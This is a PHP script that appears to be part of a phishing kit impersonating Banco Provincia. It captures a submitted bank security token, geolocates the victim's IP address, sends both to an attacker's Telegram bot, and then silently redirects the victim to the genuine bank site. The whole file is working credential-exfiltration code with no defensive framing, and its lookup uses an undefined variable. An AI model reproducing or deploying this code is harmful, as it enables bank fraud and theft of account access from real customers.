

<?php
@session_start();
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
$t3 = $_POST['t3'];

include 'infor.php';

    $dedon = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

    $country = $dedon->country;
    $city = $dedon->city;
	$message = "Token[3]: $t3 \n----------------\n$country $city $userp\n";
	
	$data = [
		'chat_id' => $gIDd,
	  
		 'text' => $message
	  ];
	  
	  $response = file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query($data) );
	
	
	
	

  header("Location: https://www.bancoprovincia.com.ar/home/");
  exit;
     

?>